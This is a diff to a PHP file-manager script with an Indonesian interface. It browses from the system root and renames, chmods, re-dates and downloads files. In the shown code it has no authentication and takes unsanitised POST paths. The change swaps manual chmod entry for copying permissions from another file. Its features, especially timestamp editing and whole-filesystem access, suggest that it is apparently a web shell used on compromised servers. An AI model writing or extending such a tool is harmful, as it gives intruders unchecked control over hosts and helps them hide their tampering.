@@ -164,7 +164,7 @@ function display_path_links($dir) {
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
             echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span>" . format_filename($folder) . "/</span>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
@@ -190,17 +190,11 @@ function display_path_links($dir) {
                     <form method='post' class='form-container'>
                         <h4>Ubah Chmod</h4>
                         <div class='form-group'>
-                            <label for='manualMode-$folder'>Manual Input</label>
-                            <input type='checkbox' id='manualMode-$folder' name='manualMode' onclick=\"toggleManualChmod('manualMode-$folder', 'chmodInput-$folder', 'mode-$folder')\">
-                        </div>
-                        <div class='form-group'>
-                            <input type='text' id='mode-$folder' name='mode' placeholder='0755' required>
-                        </div>
-                        <div class='form-group'>
-                            <input type='text' id='chmodInput-$folder' name='manualChmod' style='display:none;' placeholder='-rw-r--r--'>
+                            <label for='copyChmod-$folder'>Salin Chmod dari File Lain</label>
+                            <input type='text' id='copyChmod-$folder' name='copyChmod' placeholder='Masukkan nama file'>
                         </div>
                         <input type='hidden' name='source' value='$encodedPath'>
-                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Salin Chmod</button>
                         <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$folder')\">Batal</button>
                     </form>
                 </div>";
@@ -263,17 +257,11 @@ function display_path_links($dir) {
                     <form method='post' class='form-container'>
                         <h4>Ubah Chmod</h4>
                         <div class='form-group'>
-                            <label for='manualMode-$file'>Manual Input</label>
-                            <input type='checkbox' id='manualMode-$file' name='manualMode' onclick=\"toggleManualChmod('manualMode-$file', 'chmodInput-$file', 'mode-$file')\">
-                        </div>
-                        <div class='form-group'>
-                            <input type='text' id='mode-$file' name='mode' placeholder='0755' required>
-                        </div>
-                        <div class='form-group'>
-                            <input type='text' id='chmodInput-$file' name='manualChmod' style='display:none;' placeholder='-rw-r--r--'>
+                            <label for='copyChmod-$file'>Salin Chmod dari File Lain</label>
+                            <input type='text' id='copyChmod-$file' name='copyChmod' placeholder='Masukkan nama file'>
                         </div>
                         <input type='hidden' name='source' value='$encodedPath'>
-                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Salin Chmod</button>
                         <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$file')\">Batal</button>
                     </form>
                 </div>";
@@ -390,13 +378,20 @@ function renameFile($source, $destination) {
 }
 
 // Fungsi untuk mengubah chmod
-function changePermissions($path, $mode, $manual) {
+function changePermissions($path, $mode, $copyFrom = null) {
     $path = base64_decode(urldecode($path));
-    if ($manual) {
-        $mode = str2oct($mode);
+    if ($copyFrom) {
+        $copyFrom = realpath($copyFrom);
+        if ($copyFrom && file_exists($copyFrom)) {
+            $mode = fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
+        } else {
+            echo "<div class='alert alert-danger'>File sumber chmod tidak ditemukan.</div>";
+            return;
+        }
     } else {
         $mode = octdec($mode);
     }
+
     if (chmod($path, $mode)) {
         echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
     } else {
@@ -460,10 +455,9 @@ if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destinat
     renameFile($_POST['source'], $_POST['destination']);
 }
 
-if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) {
-    $manual = isset($_POST['manualMode']) ? true : false;
-    $mode = $manual ? $_POST['manualChmod'] : $_POST['mode'];
-    changePermissions($_POST['source'], $mode, $manual);
+if (isset($_POST['chmod']) && isset($_POST['source'])) {
+    $copyFrom = isset($_POST['copyChmod']) && !empty($_POST['copyChmod']) ? $_POST['copyChmod'] : null;
+    changePermissions($_POST['source'], '', $copyFrom);
 }
 
 if (isset($_POST['changedate']) && isset($_POST['source']) && isset($_POST['newdate'])) {
@@ -499,19 +493,6 @@ if (isset($_GET['download'])) {
         readfile($file);
         exit;
     }
-}
-
-// Fungsi untuk mengubah izin manual ke oktal
-function str2oct($str) {
-    $oct = array(0, 0, 0);
-
-    for ($i = 0; $i < 3; $i++) {
-        if ($str[$i * 3 + 1] == 'r') $oct[$i] += 4;
-        if ($str[$i * 3 + 2] == 'w') $oct[$i] += 2;
-        if ($str[$i * 3 + 3] == 'x' || $str[$i * 3 + 3] == 's' || $str[$i * 3 + 3] == 't') $oct[$i] += 1;
-    }
-
-    return octdec(implode('', $oct));
 }
 
 $rootDir = '/'; // Menggunakan root direktori sistem Linux
@@ -711,22 +692,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         function toggleNetworkInfo() {
             var element = document.getElementById("networkInfo");
             element.style.display = (element.style.display === "none" || element.style.display === "") ? "block" : "none";
-        }
-
-        function toggleManualChmod(checkboxId, manualInputId, chmodInputId) {
-            var checkbox = document.getElementById(checkboxId);
-            var manualInput = document.getElementById(manualInputId);
-            var chmodInput = document.getElementById(chmodInputId);
-
-            if (checkbox.checked) {
-                manualInput.style.display = 'block';
-                chmodInput.style.display = 'none';
-                chmodInput.removeAttribute('required');
-            } else {
-                manualInput.style.display = 'none';
-                chmodInput.style.display = 'block';
-                chmodInput.setAttribute('required', 'required');
-            }
         }
     </script>
 </body>
